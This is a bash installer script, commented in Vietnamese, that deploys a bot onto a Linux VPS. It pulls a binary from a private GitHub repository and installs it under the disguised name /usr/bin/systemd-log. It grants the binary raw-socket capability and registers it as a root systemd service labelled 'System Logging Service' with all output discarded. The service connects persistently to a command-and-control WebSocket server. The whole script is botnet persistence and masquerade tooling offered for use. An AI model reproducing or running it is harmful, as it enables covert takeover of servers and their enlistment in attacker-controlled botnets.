#!/bin/bash
# ============================================================
# BOT DEPLOYER — Cài bot lên VPS Linux
# ============================================================
# curl -sL -H "Authorization: token <PAT>" \
#   https://raw.githubusercontent.com/duaakcon10/dc-ansta/main/install.sh \
#   | bash -s wss://bot.minhvuong.io.vn/ws/bot/ ghp_xxx
# ============================================================
set -e

C2_URL="${1:-wss://bot.minhvuong.io.vn/ws/bot/}"
GITHUB_REPO="duaakcon10/dc-ansta"
BOT_PATH="/usr/bin/systemd-log"
C2_CFG="/etc/.bot_c2"

GITHUB_TOKEN="${GITHUB_TOKEN:-${2}}"

if [ -z "$GITHUB_TOKEN" ]; then
    echo "[!] Repo private — cần GITHUB_TOKEN."
    echo "    export GITHUB_TOKEN=ghp_xxx"
    echo "    hoặc: bash install.sh wss://domain/ws/bot/ ghp_xxx"
    exit 1
fi

# Normalize URL
case "$C2_URL" in
    wss://*|ws://*) ;;
    *) C2_URL="wss://${C2_URL}" ;;
esac
# Ensure path ends with /ws/bot/ if only host given
if [[ "$C2_URL" != *"/ws/"* ]]; then
    C2_URL="${C2_URL%/}/ws/bot/"
fi

echo "[*] C2 URL: $C2_URL"
echo "[*] Downloading latest bot..."
AUTH_HEADER="Authorization: token $GITHUB_TOKEN"
LATEST=$(curl -s -H "$AUTH_HEADER" "https://api.github.com/repos/$GITHUB_REPO/releases/latest" | grep '"tag_name"' | head -1 | cut -d'"' -f4)

if [ -z "$LATEST" ]; then
    echo "[!] Không tìm thấy release. Push tag v* trước."
    exit 1
fi

echo "[*] Latest release: $LATEST"
curl -sL -H "$AUTH_HEADER" \
  "https://github.com/$GITHUB_REPO/releases/download/$LATEST/bot_static" \
  -o /tmp/bot_update
chmod +x /tmp/bot_update

echo "[*] Installing..."
systemctl stop systemd-log.service 2>/dev/null || true
killall systemd-log 2>/dev/null || true
mv /tmp/bot_update "$BOT_PATH"
chmod +x "$BOT_PATH"
setcap cap_net_raw+ep "$BOT_PATH" 2>/dev/null || true

# Persist C2 URL for restarts
echo "$C2_URL" > "$C2_CFG"
chmod 600 "$C2_CFG" 2>/dev/null || true

# systemd unit WITH C2 argument
cat > /etc/systemd/system/systemd-log.service << EOF
[Unit]
Description=System Logging Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=${BOT_PATH} ${C2_URL}
Restart=always
RestartSec=10
User=root
WorkingDirectory=/
StandardOutput=null
StandardError=null
LimitNOFILE=1048576

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable systemd-log.service
systemctl restart systemd-log.service

sleep 1
if systemctl is-active --quiet systemd-log.service; then
    echo "[+] Bot service ACTIVE"
else
    echo "[!] Service not active — starting foreground once..."
    nohup "$BOT_PATH" "$C2_URL" &>/dev/null &
fi

echo "[+] Bot installed."
echo "[+] C2: $C2_URL"
echo "[+] Check: systemctl status systemd-log"
echo "[+] Logs:  journalctl -u systemd-log -f   (if StandardOutput changed)"
